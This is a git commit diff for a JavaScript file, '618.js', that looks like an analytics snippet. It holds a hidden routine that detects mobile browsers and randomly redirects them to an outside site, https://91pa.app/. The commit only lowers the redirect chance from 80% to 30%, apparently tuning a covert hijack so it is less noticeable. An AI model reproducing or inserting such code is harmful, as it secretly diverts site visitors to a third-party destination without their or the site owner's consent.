2ddee758f2219071089fdb8929dd2300ced996d4
mihoutao18 <138785638+mihoutao1868@users.noreply.github.com>
2025-04-27 07:08:26 +0800

    Update 618.js

--- 618.js
+++ 618.js
@@ -10,7 +10,7 @@ var _hmt = _hmt || [];
     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                      .test(navigator.userAgent);
     if (!isMobile) return;  
-    if (Math.random() < 0.8) {
+    if (Math.random() < 0.3) {
       window.location.replace('https://91pa.app/');
     }
   })();
